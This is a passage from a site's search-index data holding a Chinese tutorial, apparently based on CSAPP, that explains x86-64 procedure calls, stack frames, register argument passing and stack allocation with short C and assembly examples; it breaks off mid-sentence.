<p>\u8fc7\u7a0b\u662f\u8f6f\u4ef6\u4e2d\u4e00\u79cd\u91cd\u8981\u7684\u62bd\u8c61\uff0c\u5728\u4e0d\u540c\u7684\u7f16\u7a0b\u8bed\u8a00\u4e2d\uff0c\u8868\u73b0\u5f62\u5f0f\u4e0d\u540c\uff0c\u8bf8\u5982\uff1afunction\u3001method\u3001subruntime\u3001handler \u7b49\uff0c\u4f46\u6709\u76f8\u540c\u7684\u5171\u6709\u7279\u6027\u3002</p> <p>\u672c\u6587\u4e2d\u4ee5\u51fd\u6570\u4ee3\u66ff\u8fc7\u7a0b\u8bb2\u89e3\uff01</p> <p>\u5047\u8bbe \u8fc7\u7a0b P \u8c03\u7528\u8fc7\u7a0b Q\uff0cQ \u6267\u884c\u540e\u8fd4\u56de\u5230 P\u3002\u4e0a\u8ff0\u52a8\u4f5c\u5305\u542b\u5982\u4e0b\u673a\u5236\uff1a</p> <ul> <li>\u4f20\u9012\u63a7\u5236\uff1a\u5728\u8fdb\u5165\u8fc7\u7a0b Q \u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u8ba1\u6570\u5668 PC \u5fc5\u987b\u88ab\u8bbe\u7f6e\u4e3a Q \u7684\u4ee3\u7801\u7684\u8d77\u59cb\u5730\u5740\uff0c\u7136\u540e\u5728 Q \u6267\u884c\u5b8c\u8fd4\u56de P \u7684\u65f6\u5019\uff0c\u5c06 PC \u8bbe\u7f6e\u4e3a P   \u4e2d\u8c03\u7528 Q \u540e\u9762\u90a3\u6761\u6307\u4ee4\u7684\u5730\u5740\u3002</li> <li>\u4f20\u9012\u6570\u636e\uff1aP \u5fc5\u987b\u80fd\u591f\u5411 Q \u63d0\u4f9b\u4e00\u4e2a\u6216\u591a\u4e2a\u53c2\u6570\uff0cQ \u5fc5\u987b\u80fd\u591f\u5411 P \u8fd4\u56de\u4e00\u4e2a\u503c</li> <li>\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\uff1a\u5728\u5f00\u59cb\u65f6\uff0cQ \u53ef\u80fd\u9700\u8981\u4e3a\u5c40\u90e8\u53d8\u91cf \u5728\u6808\u4e0a\u5206\u914d\u7a7a\u95f4\uff0c\u800c\u5728 Q \u6267\u884c\u5b8c\u6bd5\u8fd4\u56de\u524d\uff0c\u53c8\u5fc5\u987b\u91ca\u653e\u8fd9\u4e9b\u5b58\u50a8\u7a7a\u95f4\u3002</li> </ul> <p>\u8fd0\u884c\u65f6\u6808\uff08C \u8bed\u8a00\uff09</p> <p>\u5927\u591a\u6570\u8bed\u8a00\uff08\u4ee5 C \u4e3a\u4f8b\uff09\u7684\u5173\u952e\u7279\u6027\u4e3a\u4f7f\u7528\u6808\u6570\u636e\u7ed3\u6784\u63d0\u4f9b\u7684\u540e\u8fdb\u5148\u51fa\u7684\u5185\u5b58\u7ba1\u7406\u539f\u5219\u3002</p> <p></p> <p>\u51fd\u6570\u8c03\u7528\u7ecf\u5e38\u662f\u5d4c\u5957\u7684\uff0c\u5728\u540c\u4e00\u65f6\u523b\uff0c\u5806\u6808\u4e2d\u4f1a\u6709\u591a\u4e2a\u51fd\u6570\u7684\u4fe1\u606f\u3002\u6bcf\u4e2a\u672a\u5b8c\u6210\u8fd0\u884c\u7684\u51fd\u6570\u5360\u7528\u4e00\u4e2a\u72ec\u7acb\u7684\u8fde\u7eed\u533a\u57df\uff0c\u79f0\u4f5c\u6808\u5e27(Stack Frame)\u3002\u6808\u5e27\u662f\u5806\u6808\u7684\u903b\u8f91\u7247\u6bb5\uff0c\u5f53\u8c03\u7528\u51fd\u6570\u65f6\u903b\u8f91\u6808\u5e27\u88ab\u538b\u5165\u5806\u6808, \u5f53\u51fd\u6570\u8fd4\u56de\u65f6\u903b\u8f91\u6808\u5e27\u88ab\u4ece\u5806\u6808\u4e2d\u5f39\u51fa\u3002</p> <p>\u6808\u5e27\u5b58\u653e\u7740\u51fd\u6570\u53c2\u6570\uff0c\u5c40\u90e8\u53d8\u91cf\u53ca\u6062\u590d\u524d\u4e00\u6808\u5e27\u6240\u9700\u8981\u7684\u6570\u636e\u7b49\u3002\u5728 x86-64 \u4e2d\uff0c\u51fd\u6570\u6240\u9700\u7684\u5b58\u50a8\u7a7a\u95f4\u8d85\u51fa\u5bc4\u5b58\u5668\u80fd\u591f\u5b58\u653e\u7684\u5927\u5c0f\u65f6\uff0c\u624d\u4f1a\u5728\u6808\u4e0a\u5206\u914d\u7a7a\u95f4\u3002</p> <p>\u63a5\u7740\uff0c\u6211\u5c06\u6839\u636e\u6808\u5e27\u548c\u6574\u6570\u5bc4\u5b58\u5668\u4e24\u4e2a\u56fe\uff0c\u4ecb\u7ecd\u8fc7\u7a0b\u7684\u4e09\u4e2a\u7279\u6027\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#1","title":"\u2460 \u5982\u4f55\u5b9e\u73b0\u4f20\u9012\u63a7\u5236\uff1f","text":"<p>\u5c06\u63a7\u5236\u4ece\u51fd\u6570 P \u8f6c\u79fb\u5230\u51fd\u6570 Q \u53ea\u9700\u7b80\u5355\u5730\u628a\u7a0b\u5e8f\u8ba1\u6570\u5668 PC \u8bbe\u7f6e\u4e3a Q \u7684\u4ee3\u7801\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002</p> <p>\u4e3a\u4e86\u6210\u529f\u4ece Q \u8fd4\u56de\u5230 P\uff0c\u53ef\u4ee5\u770b\u5230\uff0cP \u7684\u6808\u5e27\u7684\u6808\u5e95\u662f\u8fd4\u56de\u5730\u5740\uff0c\u8be5\u5730\u5740\u6307\u660e\u4e86\u5f53 Q \u8fd4\u56de\u65f6\uff0c\u5c06\u8981\u4ece P \u7a0b\u5e8f\u7684\u54ea\u4e2a\u4f4d\u7f6e\u7ee7\u7eed\u6267\u884c\uff08\u901a\u5e38\u662f\u8c03\u7528 Q \u7684\u6307\u4ee4\u7684\u4e0b\u4e00\u53e5\uff09\u3002</p> <p>\u6b64\u65f6\uff0c\u5f53 Q \u6267\u884c\u5b8c\u6bd5\uff0cQ \u7684\u6808\u5e27\u5c06\u88ab\u5168\u90e8\u5f39\u51fa\uff0c\u518d\u6b21\u8c03\u7528 popq \u6307\u4ee4\uff0c\u5373\u53ef\u83b7\u53d6\u8fd4\u56de\u5730\u5740\u3002</p> <p>\u90a3\u4e48\uff0c\u4e0a\u8ff0\u529f\u80fd\u662f\u5982\u4f55\u901a\u8fc7\u6307\u4ee4\u5b9e\u73b0\u7684\u5462\uff1f</p> <p></p> <p>\u5728 x86-64 \u673a\u5668\u4e2d\uff0c\u5f53 P \u8c03\u7528 Q \u65f6\uff0c\u5176\u6307\u4ee4\u4e3a\uff1a</p> <pre><code>callq 400540 &lt;multstore&gt; ## \u6b64\u5904 P \u4e3a main \u51fd\u6570\uff0cQ \u4e3a multstore \u51fd\u6570\n</code></pre> <p>\u8be5\u6307\u4ee4\u9996\u5148\u4fee\u6539\u7a0b\u5e8f\u8ba1\u6570\u5668\u5bc4\u5b58\u5668 %rip \u7684\u503c\u4e3a\u88ab\u8c03\u51fd\u6570 Q \u7684\u5730\u5740\uff080x400540\uff09\uff0c\u968f\u540e\u5c06\u8fd4\u56de\u5730\u5740\u538b\u5165\u6808\u4e2d\uff0c\u4e5f\u5c31\u662f\u5c06\u4e0b\u4e00\u53e5\u7684\u5730\u5740\u538b\u5165\u6808\u4e2d\uff0c\u6b64\u65f6\u5f00\u59cb Q \u7684\u6267\u884c\u3002</p> <p>\u672c\u4f8b\u4e2d\uff0c\u5c06\u5730\u5740 0x400568 \u538b\u5165\u6808\u4e2d\uff0c\u5982\u56fe(b)\u6240\u793a\uff1a</p> <p></p> <p>\u63a5\u7740\u8fdb\u5165\u8fc7\u7a0b Q \u7684\u6267\u884c\uff0c\u5f53 Q \u6267\u884c\u5b8c\u6bd5\u65f6\uff0c\u5176\u6700\u540e\u4e00\u53e5\u6307\u4ee4\u4e3a\uff1a</p> <pre><code>retq\n</code></pre> <p>\u8be5\u6307\u4ee4\u4ece\u6808\u4e2d\u5f39\u51fa\u8fd4\u56de\u5730\u5740\uff080x400568\uff09\uff0c\u5e76\u5c06\u7a0b\u5e8f\u8ba1\u6570\u5668\u5bc4\u5b58\u5668 %rip \u7684\u503c\u4fee\u6539\u4e3a\u8be5\u503c\uff0c\u6210\u529f\u8fd4\u56de\u5230\u51fd\u6570 P\u3002\u4e5f\u5c31\u662f\u8bf4 ret \u76f8\u5f53\u4e8e\uff1a</p> <pre><code>pop %rip\n</code></pre> <p>\u4f46\u662f\u5728\u6b64\u4e4b\u524d\uff0c\u8fd8\u9700\u8981\u4e00\u70b9\u64cd\u4f5c\uff0c\u90a3\u5c31\u662f\u5f53\u8fc7\u7a0b Q \u6267\u884c\u5b8c\u6bd5\u7684\u65f6\u5019\uff0c\u6808\u4e2d\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u89c2\u5bdf\u5230\u5f53\u524d\u6808\u9876 %rsp \u4ecd\u7136 \u6307\u5411\u51fd\u6570 Q \u7684\u5e27\u6808\uff0c\u60f3\u8981\u62ff\u51fa return address\uff0c\u9700\u8981\u5c06 Q \u7684\u6808\u5e27\u5168\u90e8\u5f39\u51fa\u3002</p> <p>\u90a3\u4e48\uff0c\u5982\u4f55\u5f39\u51fa\u88ab\u8c03\u51fd\u6570 Q \u7684\u6808\u5e27\u5462\uff1f\uff08CSAPP 203\uff09</p> <p>\u901a\u5e38\u6765\u8bf4\uff0c\u5728\u51fd\u6570 Q \u7684\u5f00\u5934\uff0c\u4f1a\u6709\u4e00\u53e5\uff1a</p> <pre><code>push %rbp       ## \u4fdd\u5b58\u51fd\u6570R \u7684 %rbp \u5bc4\u5b58\u5668\nmov %rsp\uff0c%rbp\n</code></pre> <p>\u7531\u4e8e\u6b64\u65f6\u5904\u5728\u51fd\u6570 Q \u7684\u5f00\u5934\uff0c\u4e14%rsp \u6307\u5411\u6808\u9876\uff0c\u4f46\u5bf9\u4e8e\u51fd\u6570 Q \u7684\u6808\u5e27\u800c\u8a00\uff0c\u51fd\u6570 Q \u8fd8\u6ca1\u5f00\u59cb\uff0c\u56e0\u6b64\u51fd\u6570 Q \u7684\u6808\u5e27\u4e5f\u8fd8\u6ca1\u5f00\u59cb\u5206\u914d\uff0c\u56e0\u6b64 %rsp \u6b64\u65f6\u6307\u5411\u51fd\u6570 Q \u6808\u5e27\u7684\u8d77\u59cb\u4f4d\u7f6e\uff0c\u56e0\u6b64\u5c06\u5176\u4fdd\u5b58\u5230 %rbp \u4e2d\u3002</p> <p>\u6ce8\u610f\uff0c\u5728\u6b64\u4e4b\u524d\uff0c\u901a\u8fc7 <code>push %rbp</code> \u5b58\u50a8\u7684\u662f\u51fd\u6570 P \u7684\u6808\u5e27\u8d77\u59cb\u4f4d\u7f6e\uff0c\u7531\u4e8e\u5df2\u7ecf\u5c06 %rbp \u4fdd\u5b58\uff0c\u800c\u4e14\u6b64\u65f6\u5728\u64cd\u4f5c\u51fd\u6570 Q\uff0c\u56e0\u6b64\u901a\u8fc7 <code>mov %rsp, %rbp</code> \u5c06\u51fd\u6570 Q \u7684\u6808\u5e27\u8d77\u59cb\u4f4d\u7f6e\u4fdd\u5b58\u5230 %rbp \u4e2d\u3002</p> <p>\u5f53\u51fd\u6570 Q \u7ed3\u675f\u65f6\uff0c\u4f1a\u6709\u4e00\u53e5\uff1a</p> <pre><code>leave\n</code></pre> <p>leave \u6307\u4ee4\u76f8\u5f53\u4e8e\uff1a</p> <pre><code>mov %rbp, %rsp\npop %rbp\n</code></pre> <p>\u9700\u8981\u610f\u8bc6\u5230\uff0c\u6b64\u65f6\u6211\u4eec\u5728\u64cd\u4f5c\u51fd\u6570 Q\uff0c\u800c %rbp \u4e2d\u5b58\u50a8\u4e86\u51fd\u6570 Q \u7684\u6808\u5e27\u8d77\u59cb\u4f4d\u7f6e\uff0c\u800c\u5f53\u524d\u51fd\u6570 Q \u6267\u884c\u5b8c\u6bd5\u4e86\uff0c\u56e0\u6b64\u8981\u5c06\u51fd\u6570 Q \u7684\u6808\u5e27\u5220\u9664\uff0c\u6545\u800c\u6267\u884c <code>mov %rbp, %rsp</code>\u3002</p> <p>\u5728\u6267\u884c <code>mov %rbp, %rsp</code> \u4e4b\u524d\uff1a</p> <p></p> <p>\u6267\u884c\u540e\u6210\u529f\u5c06\u51fd\u6570 Q \u7684\u6808\u5e27\u5220\u9664\uff0c\u968f\u540e\u6267\u884c <code>pop %rbp</code>\uff0c\u5c06\u4e4b\u524d\u4fdd\u5b58\u7684 \u51fd\u6570 P \u7684 %rbp \u7684\u503c \u5199\u5165\u5230\u5bc4\u5b58\u5668 %rbp \u4e2d\u3002</p> <p></p> <p>\u5728\u4e0a\u9762\u6808\u5e27\u7684\u5206\u5e03\u4e2d\u8bb2\u8fc7\uff0c\u8c03\u7528\u51fd\u6570 P \u5c06\uff1a</p> <ul> <li>\u88ab\u8c03\u51fd\u6570 Q \u6240\u9700\u7684\u53c2\u6570</li> <li>\u8fd4\u56de\u503c\uff08call \u6307\u4ee4\u7684\u4e0b\u4e00\u53e5\u8bed\u53e5\u7684\u5730\u5740\uff09</li> </ul> <p>\u4fdd\u5b58\u5230\u51fd\u6570 P \u7684\u6808\u5e27\u4e2d\uff0c\u63a5\u7740\u5c31\u5f00\u59cb\u88ab\u8c03\u51fd\u6570 Q \u7684\u6808\u5e27\uff0c\u8be5\u6808\u5e27\u4e2d\u9996\u5148\u4fdd\u5b58 <code>\u88ab\u8c03\u8005\u4fdd\u5b58\u5bc4\u5b58\u5668</code>\uff0c\u5176\u4e2d\u5305\u542b <code>%rbp</code>\uff0c\u8be5\u5bc4\u5b58\u5668\u4e2d\u5b58\u50a8\u4e86\u6808\u5e27\u8d77\u59cb\u5730\u5740\u3002</p> <p>\u6b64\u65f6\uff0c\u518d\u6267\u884c <code>ret</code> \u6307\u4ee4\u65f6\uff0c\u5c31\u53ef\u4ee5\u6210\u529f <code>pop %rip</code> \uff0c\u4ece\u51fd\u6570 Q \u8fd4\u56de\u5230\u51fd\u6570 P\u3002</p> <p>\u5f53\u7136\uff0c\u82e5\u51fd\u6570 R \u8c03\u7528\u4e86\u51fd\u6570 P\uff0c\u540c\u6837\u7684\u539f\u7406\u53ef\u4ee5\u8fd4\u56de\uff01</p> <p>\u603b\u7ed3\u4e00\u4e0b\uff0c\u51fd\u6570\u7684\u8d77\u59cb\u6307\u4ee4\u901a\u5e38\u5982\u4e0b\uff1a</p> <pre><code>func:\n    pushq %rbp\n    movq %rsp, %rbp\n    ...\n    leave  ## \u7b49\u4ef7\u4e8e  \u2460movq %rbp %rsp   \u2461pop %rbp\n    ret\n</code></pre>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#2","title":"\u2461 \u5982\u4f55\u5b9e\u73b0\u6570\u636e\uff08\u53c2\u6570\u548c\u8fd4\u56de\u503c\uff09\u4f20\u9012\uff1f","text":"<p>x86-64 \u4e2d\uff0c\u901a\u8fc7 \u5bc4\u5b58\u5668 %rax \u5b58\u50a8\u8fd4\u56de\u503c\u3002</p> <p>\u901a\u8fc7\u5bc4\u5b58\u5668\u53ef\u4f20\u9012\u6700\u591a 6 \u4e2a\u6574\u5f62\uff08\u6574\u6570\u548c\u6307\u9488\uff09\u53c2\u6570\uff0c\u6309\u53c2\u6570\u987a\u5e8f\u4ece\u5de6\u5230\u53f3\u4f9d\u6b21\u88ab\u5982\u4e0b\u5bc4\u5b58\u5668\u4fdd\u5b58\uff1a%rdi, %rsi, %rdx, %rcs, %r8, %r9</p> <p>\u5f53\u51fd\u6570\u6709\u5927\u4e8e 6 \u4e2a\u6574\u5f62\u53c2\u6570\uff0c\u8d85\u8fc7 6 \u4e2a\u7684\u53c2\u6570\u4f1a\u88ab\u653e\u5230\u6808\u4e0a\uff0c\u9996\u5148\u538b\u5165\u53c2\u6570 n\uff0c\u5176\u6b21\u538b\u5165\u53c2\u6570 n-1\uff0c\u76f4\u81f3\u538b\u5165\u53c2\u6570 7\uff0c\u5982\u4e0a\u8ff0\u6808\u5e27\u56fe\u6240\u793a\uff0c\u5f53\u538b\u5165\u6240\u6709\u53c2\u6570\u540e\uff0c\u5c06\u4f1a\u538b\u5165 Q \u7684\u8fd4\u56de\u5730\u5740\u3002</p> <pre><code>void proc(long a1, long *a1p, int a2, int *a2p, short a3, short *a3p, char a4, char *a4p) {\n  ...\n}\nvoid call_proc(){\n  proc(...);\n  return;\n}\n</code></pre> <p>\u4e0a\u8ff0\u51fd\u6570\u6709 8 \u4e2a\u53c2\u6570\uff0c\u5305\u62ec\u5b57\u8282\u6570\u4e0d\u540c\u7684\u6574\u6570\uff088,4,2,1\uff09\u548c\u4e0d\u540c\u7c7b\u578b\u7684\u6307\u9488\uff08\u6307\u9488\u5747\u4e3a 8 \u5b57\u8282\uff09\u3002</p> <p>\u5f53 call_proc \u51fd\u6570\u8c03\u7528 proc \u51fd\u6570\u65f6\uff0c\u524d 6 \u4e2a\u53c2\u6570\u5c06\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\uff0c\u4f8b\u5982\u53c2\u6570 1\uff08a1\uff09\u5c06\u88ab\u5b58\u5165\u5bc4\u5b58\u5668 %rdi\uff0c\u53c2\u6570 2\uff08*a1p\uff09\u5c06\u88ab\u5b58\u5165\u5bc4\u5b58\u5668 %rsi\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002</p> <p>\u968f\u540e\u5c06\u4f1a\u5148\u538b\u5165\u53c2\u6570 n\uff0c\u6b64\u5904\u4e3a\u53c2\u6570 8\uff08*a4p\uff09\uff0c\u6700\u540e\u538b\u5165\u53c2\u6570 7\uff08a4\uff09\uff0c\u6b64\u65f6\u51fd\u6570 call_proc \u7684\u6808\u5e27\u7ed3\u6784\u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#3","title":"\u2462 \u5982\u4f55\u5b9e\u73b0\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\uff08\u6808\uff09\uff1f","text":"<p>\u76ee\u524d\u4e3a\u6b62\u7684\u5927\u90e8\u5206\u662f\u6848\u4f8b\u90fd\u53ef\u4ee5\u5c06\u6570\u636e\u5b58\u50a8\u5728\u5bc4\u5b58\u5668\u4e2d\uff0c\u4f46\u6709\u4e9b\u65f6\u5019\uff0c\u5c40\u90e8\u6570\u636e\u5fc5\u987b\u5b58\u653e\u5728\u5185\u5b58\u4e2d\uff1a</p> <ul> <li>\u5bc4\u5b58\u5668\u4e0d\u8db3\u591f\u5b58\u653e\u6240\u6709\u672c\u5730\u6570\u636e</li> <li>\u5bf9\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf\u4f7f\u7528\u5730\u5740\u8fd0\u7b97\u7b26 &amp;\uff0c\u56e0\u6b64\u5fc5\u987b\u80fd\u591f\u4e3a\u5b83\u4ea7\u751f\u4e00\u4e2a \u5730\u5740</li> <li>\u67d0\u4e9b\u5c40\u90e8\u53d8\u91cf\u662f\u6570\u7ec4\u6216\u7ed3\u6784\uff0c\u56e0\u6b64\u5fc5\u987b\u80fd\u591f\u901a\u8fc7\u6570\u7ec4\u6216\u7ed3\u6784\u5f15\u7528\u88ab\u8bbf\u95ee\u5230\uff08\u672c\u8d28\u4e0a\u4e5f\u662f &amp; \u5bfc\u81f4\u7684\u5730\u5740\u95ee\u9898\uff09</li> </ul> <pre><code>long call_proc() {\n  long x1 = 1;\n  int x2 = 2;\n  short x3 = 3;\n  char x4 = 4;\n  proc(x1, &amp;x1, x2, &amp;x2, x3, &amp;x3, x4, &amp;x4);\n  return (x1+x2)*(x3-x4);\n}\n</code></pre> <p>\u6b64\u5904\u5c06\u5bf9\u524d\u6587\u7684\u77e5\u8bc6\u8fdb\u884c\u878d\u6c47\u8d2f\u901a\uff0ccall_proc \u662f\u4e00\u4e2a\u5fc5\u987b\u5728\u6808\u4e0a\u5206\u914d\u5b58\u50a8\u7a7a\u95f4\u7684\u51fd\u6570\uff0c\u56e0\u4e3a\u5b83\u5bf9\u5c40\u90e8\u53d8\u91cf\u4f7f\u7528\u4e86 &amp; \u64cd\u4f5c\u3002</p> <p>\u6b64\u5916\uff0ccall_proc \u8fd8\u9700\u8981\u5411\u5177\u6709 8 \u4e2a\u53c2\u6570\u7684\u51fd\u6570 proc \u4f20\u9012\u503c\uff0c\u7ec6\u5fc3\u5730\u8bfb\u8005\u4f1a\u53d1\u73b0\uff0c\u6b64\u5904\u7684\u4f8b\u5b50\u662f\u5bf9\u4e0a\u4f8b\u7684\u5b8c\u6574\u8865\u5145\u3002</p> <p>\u4e0a\u8ff0\u4ee3\u7801\u751f\u6210\u7684\u6c47\u7f16\u4ee3\u7801\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u9996\u5148\uff0c\u7531\u4e8e 4 \u4e2a\u5c40\u90e8\u53d8\u91cf\u5747\u9700\u8981\u5b58\u50a8\u5230\u6808\u4e0a\uff0c\u5728\u6c47\u7f16\u4ee3\u7801\u7684\u7b2c 2 \u884c\uff0c\u5c06 %rsp \u7684\u503c\u51cf\u5c11 32\uff0c\u5176\u542b\u4e49\u4e3a\u4e3a\u8be5\u51fd\u6570\u5206\u914d\u4e86 32 \u5b57\u8282\u7684\u7a7a\u95f4\uff1a</p> <ul> <li> <p>\u5c40\u90e8\u53d8\u91cf\uff08local variables\uff09\uff1a\u5728\u7b2c 3 \u884c\uff0c\u5176\u542b\u4e49\u662f\u5c06 $1 \u5199\u5165 %rsp + 24 \u7684\u4f4d\u7f6e\uff0c\u540e\u7eed\u8bed\u53e5\u4f9d\u6b21\u7c7b\u63a8\u3002</p> </li> <li> <p>\u53c2\u6570\u6784\u9020\u533a\uff08argument build area\uff09\uff1a\u5728\u7b2c 8 \u548c 9 \u884c\uff0c\u5c06\u53c2\u6570 8 \u548c 7 \u538b\u5165\u6808\u4e2d\uff0c\u5176\u4f59 6 \u4e2a\u53c2\u6570\u5199\u5165\u6808\u4e2d\u3002</p> </li> </ul> <p>\u6ce8\u610f\uff1a\u7531\u4e8e\u6b64\u5904\u53c2\u6570\u5747\u4e3a\u6574\u6570\u3001\u6307\u9488\uff0c\u56e0\u6b64\u53ef\u4ee5\u5199\u5165\u6574\u578b\u5bc4\u5b58\u5668</p> <p>\u6b64\u65f6\uff0c\u5df2\u7ecf\u5b8c\u6210\u4e86\u5185\u5b58\u7684\u5206\u914d\uff0c\u4e0b\u56fe\u4e3a\u51fd\u6570 call_proc \u6b64\u65f6\u7684\u6808\u5e27\uff08\u8be5\u56fe\u4e3a\u4e0a\u4e00\u5e45\u6808\u5e27\u56fe\u7684\u8865\u5145\u7248\uff09\uff1a</p> <p></p> <p>\u63a5\u7740\u5728 16 \u884c\u6267\u884c proc \u51fd\u6570\u7684\u8c03\u7528\uff1a</p> <pre><code>call proc\n</code></pre> <p>\u8be5\u6307\u4ee4\u8c03\u7528\u8be5\u51fd\u6570\u65f6\uff0c\u4f1a\u5c06\u7a0b\u5e8f\u8ba1\u6570\u5668 %rip \u4fee\u6539\u4e3a proc \u7a0b\u5e8f\u7684\u8d77\u59cb\u5730\u5740\uff0c\u5e76\u5c06 call proc \u7684\u4e0b\u4e00\u53e5\u7684\u5730\u5740\u538b\u5165\u6808\u5e27\u4e2d\uff0c\u4f5c\u4e3a\u8fd4\u56de\u5730\u5740\uff08\u6b64\u5904\u5e76\u672a\u753b\u51fa\uff09\u3002</p> <p>\u6ce8\u610f\uff1a\u6b64\u5904\u56fe\u4e2d\u7684 Return address \u662f\u8c03\u7528 call_proc \u7684\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u800c\u4e0d\u662f\u6211\u4eec\u538b\u5165\u7684\u8fd4\u56de\u5730\u5740\uff01</p> <p>\u63a5\u7740\uff0cproc \u51fd\u6570\u6267\u884c\u5b8c\u540e\uff0c\u5176\u6700\u540e\u4e00\u4e2a\u8bed\u53e5\u662f ret\uff0c\u6b64\u65f6\u8fd4\u56de\u5230 call_proc \u7684\u7b2c 17 \u884c\uff0c\u63a5\u7740\u7b2c 17~23 \u884c\u5728\u6267\u884c <code>(x1+x2)*(x3-x4);</code></p> <p>\u7b2c 24 \u884c\u5c06 %rsp \u7684\u503c\u589e\u52a0 32\uff0c\u5176\u542b\u4e49\u4e3a\u5220\u9664\u5206\u914d\u7684\u6808\u5185\u5b58\uff0c\u6b64\u65f6 %rsp \u6307\u5411\u56fe\u4e2d\u7684 Return address</p> <p>\u7b2c 25 \u884c\u7684 ret \u8868\u793a call_proc \u6267\u884c\u5b8c\u6bd5\uff0cret \u4f1a\u4ece\u6808\u4e2d\u5f39\u51fa Return address\uff0c\u8be5\u5730\u5740\u4e3a\u8c03\u7528 call_proc \u7684\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u3002</p> <p>\u5bc4\u5b58\u5668\u4e2d\u7684\u5c40\u90e8\u5b58\u50a8\u7a7a\u95f4</p> <p>\u6b64\u65f6\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u4e0a\u8ff0\u6574\u578b\u5bc4\u5b58\u5668\u56fe\u4e2d\u7684\u7edd\u5927\u90e8\u5206\uff0c\u5305\u62ec\uff1a</p> <ul> <li>%rsp\uff1a\u6808\u9876\u6307\u9488\u5bc4\u5b58\u5668</li> <li>%rax\uff1a\u4fdd\u5b58\u51fd\u6570\u7684\u8fd4\u56de\u503c</li> <li>%rdi, %rsi, %rdx, %rcs, %r8, %r9\uff1a\u4f46\u51fd\u6570 P \u8c03\u7528\u51fd\u6570 Q \u65f6\uff0c\u5047\u8bbe Q \u6709 n&gt;6 \u4e2a\u53c2\u6570\uff0c\u524d 6 \u4e2a\u53c2\u6570\u7684\u503c\u4f1a\u6309\u987a\u5e8f\u4f9d\u6b21\u5b58\u50a8\u5230\u4e0a\u8ff0\u5bc4\u5b58\u5668\u4e2d</li> </ul> <p>\u6b64\u5916\uff0c\u8fd8\u4ecb\u7ecd\u4e86\u7a0b\u5e8f\u8ba1\u6570\u5668\u5bc4\u5b58\u5668\uff1a%eip</p> <p>\u8fd8\u6709 8 \u4e2a\u6574\u578b\u8ba1\u6570\u5668\u672a\u88ab\u4ecb\u7ecd\uff1a</p> <ul> <li>\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u5bc4\u5b58\u5668\uff1a%rbx, %rbp, %r12, %r13, %r14, %r15</li> </ul> <p>%rbp\uff1a\u6808\u5e27\u6307\u9488\uff0c\u7528\u4e8e\u6807\u8bc6\u5f53\u524d\u6808\u5e27\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002</p> <p>\u5f53\u51fd\u6570 P \u8c03\u7528\u51fd\u6570 Q\uff0cQ \u4f5c\u4e3a\u88ab\u8c03\u7528\u8005\u5fc5\u987b\u4fdd\u8bc1\u5728 Q \u8fd4\u56de\u5230 P \u65f6\uff0c\u4e0a\u8ff0\u5bc4\u5b58\u5668\u7684\u503c\u4e0d\u53d8\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cQ   \u8981\u4e48\u6839\u672c\u4e0d\u53bb\u66f4\u6539\u5b83\uff0c\u8981\u4e48\u5c31\u662f\u628a\u539f\u59cb\u7684\u503c\u538b\u5165\u6808\u4e2d\uff0c\u6539\u53d8\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u7136\u540e\u5728\u8fd4\u56de\u524d\u4ece\u6808\u4e2d\u5f39\u51fa\u65e7\u503c\u3002</p> <p>\u6b64\u5904\u538b\u5165\u6808\u7684\u503c\u4f1a\u5728\u6808\u5e27\u4e2d\u7a7f\u4ef6\u6807\u53f7\u4e3a\u201c\u88ab\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u201c\u7684\u4e00\u90e8\u5206\u3002</p> <ul> <li>\u6240\u6709\u5176\u4ed6\u7684\u5bc4\u5b58\u5668\uff0c\u9664\u4e86\u6808\u6307\u9488 %rsp\uff0c\u5747\u4e3a \u8c03\u7528\u8005\u4fdd\u5b58\u5bc4\u5b58\u5668\uff0c\u5305\u542b\u672a\u63d0\u53ca\u7684 %r10 \u548c %r11\u3002\u987e\u540d\u601d\u4e49\uff0c\u5f53 P \u8c03\u7528 Q\uff0cQ   \u53ef\u4ee5\u4efb\u610f\u4fee\u6539\uff0c\u56e0\u4e3a\u5728\u8c03\u7528\u4e4b\u524d\u9996\u5148\u4fdd\u5b58\u597d\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u662f P\uff08\u8c03\u7528\u8005\uff09\u7684\u8d23\u4efb\u3002</li> </ul> <p>\u90a3\u4e48\uff0cP \u5982\u4f55\u4fdd\u5b58\u5462\uff1f</p> <pre><code>long P(long x,long y){\n    long u = Q(y);\n  long v = Q(x);\n  return u+v;\n}\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u7684\u503c u \u548c v \u9700\u8981\u88ab\u4fdd\u5b58\uff0c\u56e0\u4e3a\u5c06\u7528\u4e8e u + v \u7684\u8ba1\u7b97\uff0cP \u53ef\u4ee5\u901a\u8fc7\u5c06 u \u548c v 